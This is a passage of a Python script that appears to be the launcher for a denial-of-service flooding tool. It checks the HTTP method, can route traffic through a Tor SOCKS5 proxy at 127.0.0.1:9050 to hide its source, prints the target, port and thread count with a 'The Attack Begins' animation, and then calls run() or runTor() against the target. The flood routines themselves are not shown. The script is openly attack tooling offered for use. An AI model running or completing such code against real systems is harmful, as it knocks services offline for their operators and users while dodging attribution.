	print(f"{color.WHITE}[{color.RED}!{color.WHITE}] "+method+" Is Not HTTP Method")
	sys.exit(1)
if havetor == True:
	tornet = args.tor
	print(tornet)
if havetor == False:
	tornet = None

if tornet or "--onion" in sys.argv or "-o" in sys.argv:
	toraddr, torport = "127.0.0.1", 9050
	toraddr, torport= tornet.split(":")
	print("[+] Target : "+str(target))
	print("[+] Port : "+str(port))
	print("[+] Method : "+str(method))
	print("[+] Thread : "+str(thread))
	print(f"[+] Tor : {toraddr}:{torport} ( Socks5 )")
	tidur = time.sleep
	print("")
	for i in range(5):
		print("The Attack Begins •°°",end="\r")
		tidur(0.4)
		print("The Attack Begins °•°",end="\r")
		tidur(0.3)
		print("The Attack Begins °°•",end="\r")
		tidur(0.2)
		print("The Attack Begins °°°",end="\r")
		tidur(0.1)
	try:
		runTor(target,int(port),thread,toraddr,torport,sleep,method)
	except KeyboardInterrupt:
		print(f"{color.WHITE}[{color.RED}!{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
		sys.exit(1)



if tornet == None:
	print("[+] Target : "+str(target))
	print("[+] Port : "+str(port))
	print("[+] Thread : "+str(thread))
	print("[+] Method : "+str(method))
	print(f"[+] Tor : Not Actived")
	print("")
	tidur = time.sleep
	for i in range(5):
		print("The Attack Begins •°°",end="\r")
		tidur(0.4)
		print("The Attack Begins °•°",end="\r")
		tidur(0.3)
		print("The Attack Begins °°•",end="\r")
		tidur(0.2)
		print("The Attack Begins °°°",end="\r")
		tidur(0.1)
	try:
		run(target,int(port),thread,sleep,method)
	except KeyboardInterrupt:
		print(f"{color.WHITE}[{color.RED}-{color.WHITE}] {color.RED}Keyboard Interrupt!{color.WHITE} Canceling\n"+" "*17)
		sys.exit(1)
